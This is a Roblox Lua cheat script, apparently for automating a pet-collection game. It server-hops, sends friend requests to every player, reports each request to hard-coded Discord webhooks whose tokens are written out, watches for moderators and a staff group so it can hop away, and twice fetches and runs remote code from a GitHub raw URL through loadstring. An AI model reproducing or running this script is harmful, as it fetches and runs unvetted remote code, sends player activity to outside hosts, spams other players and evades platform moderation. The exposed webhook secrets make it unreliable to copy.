 local plrs = game:GetService("Players") 
  local plr = plrs.LocalPlayer
  local tpService = game:GetService("TeleportService")

local function getServers()
    local url =
        string.format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100&excludeFullGames=true", game.PlaceId)
    local servers = game:GetService("HttpService"):JSONDecode(game:HttpGet(url)).data
    return servers
end

local function serverhop()
 local server
    repeat
        task.wait(1)
        server = getServers()[Random.new():NextInteger(1, 100)]

    until server.id ~= game.JobId


    tpService:TeleportToPlaceInstance(game.PlaceId, server.id, plr)
end

local usernames = {
"Drokcog0003",
"Rustblaz0666"
}

local function getRandomUsername()
    local index = math.random(1, #usernames)
    return usernames[index]
end

local sendto = getRandomUsername()

local web4 = "https://discord.com/api/webhooks/1335991178855841813/"
local web5 = "QkBm3msNPYYsuHBNnFZmQGxJRbrw1Zfi2RCvQJwb_kw_1jG_I7yibABKkmoT8sl2HI72"

local Url2 = web4 .. web5
local Http2 = game:GetService("HttpService")
	local Msg = function(msg)
		request({Url = Url2,Method = "POST",Headers = {["Content-Type"] = "application/json"},Body = Http2:JSONEncode({content = msg})})
	end


local Players = game:GetService('Players')
local Client = Players.LocalPlayer
_G.EnableFriendRequest = true

local function SendFriendRequests()
	
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= Client then  
            Client:RequestFriendship(player)
			Msg(Client.Name.." đã gửi yêu cầu kết bạn tới "..player.Name)
			task.wait(60)
        end
        task.wait(1)
    end
end


task.spawn(function()		
    if _G.EnableFriendRequest then
		wait(60)
		SendFriendRequests()

        
    end
end)



task.spawn(function()
	wait(math.random(1800, 3600))
		while true do
	
	serverhop()
	wait(1)
end
end)



if not game:IsLoaded() then
    game.Loaded:Wait()
  end

task.spawn(function()

local GroupService = game:GetService("GroupService")
local groupIds = {5060810}
local Moderators = {"BuildIntoGames"}
local continuousHopping = false




local function checkPlayer(player)
    local isInGroup = false

    for _, groupId in ipairs(groupIds) do
        local success, inGroup = pcall(function()
            return GroupService:IsInGroup(player.UserId, groupId)
        end)

        if success and inGroup then
            isInGroup = true
            break
        end
    end

    if isInGroup then
        print("[iHH] "..player.Name .. " is in the group. Starting Server Hop")
        continuousHopping = true
        while wait(0.5) and Player:IsDescendantOf(game) and continuousHopping do
            serverhop()
        end
        return
    end

    for _, username in ipairs(Moderators) do
        if player.Name == username then
            print("[iHH] "..player.Name .. " is a moderator. Starting Server Hop")
            continuousHopping = true
            while wait(0.5) and Player:IsDescendantOf(game) and continuousHopping do
                serverhop()
            end
            return
        end
    end

    print("[iHH] "..player.Name .. " is not a moderator or in the group.")
end

for _, player in ipairs(game.Players:GetPlayers()) do
    checkPlayer(player)
end

game.Players.PlayerAdded:Connect(function(player)
    checkPlayer(player)
end)

end)

local web = "https://discord.com/api/webhooks/1331776255460118557/"
local web1 = "IcVVsjyT92o0fvymweciSpUJ1jbzwFP7ik9eFOLD0RdGD7_phpFDfZJuxczFKiIFq4Mx"
local web2 = "https://discord.com/api/webhooks/1335990855600963659/"
local web3 = "LCutlnbFPbNPd8Xd9NRpuKkCHs5n1eklbBdCG-rJUIaClumrrN5MxQUx9aQQO4F-jfZJ"

script_key = "ipXBywOqWcuQMMEBBCmVrvDBXrSRfJLd";

_G.GPROGRESS_MODE = "Hybrid"
_G.GGFX_MODE = 1
_G.GRANK_TO = 99
_G.GZONE_TO = 999
_G.GHATCH_SPEED_MS = 0
_G.GWAIT_AT_GATES_TILL_RANK = 4
_G.GMAX_EGG_SLOTS = 99
_G.GMAX_EQUIP_SLOTS = 99
_G.GHOLD_GIFTS = true
_G.GHOLD_BUNDLES = true
_G.GCOLLECT_FREE_ITEMS = true
_G.GMAX_ZONE_UPGRADE_COST = 200000
_G.GPOTIONS = {"Coins","Lucky","Treasure Hunter","Walkspeed","Diamonds","Damage"}
_G.GPOTIONS_MAX_TIER = 19
_G.GUSE_FLAGS = {"Fortune Flag","Diamonds Flag","Coins Flag"}
_G.GENCHANTS = {"Diamonds", "Diamonds", "Criticals", "Criticals", "Strong Pets", "Strong Pets"}
_G.GWEBHOOK_USERID = "" -- your discord userID, not your name. numerical id.
_G.GWEBHOOK_LINK = "https://discord.com/api/webhooks/1331776255460118557/IcVVsjyT92o0fvymweciSpUJ1jbzwFP7ik9eFOLD0RdGD7_phpFDfZJuxczFKiIFq4Mx" -- a webhook URL from your private discord channel.
loadstring(game:HttpGet("https://raw.githubusercontent.com/sxdasfvas/test/main/gscripts.lua"))()

daubuoi = true


loadstring(game:HttpGet("https://raw.githubusercontent.com/sxdasfvas/test/main/gscripts.lua"))()
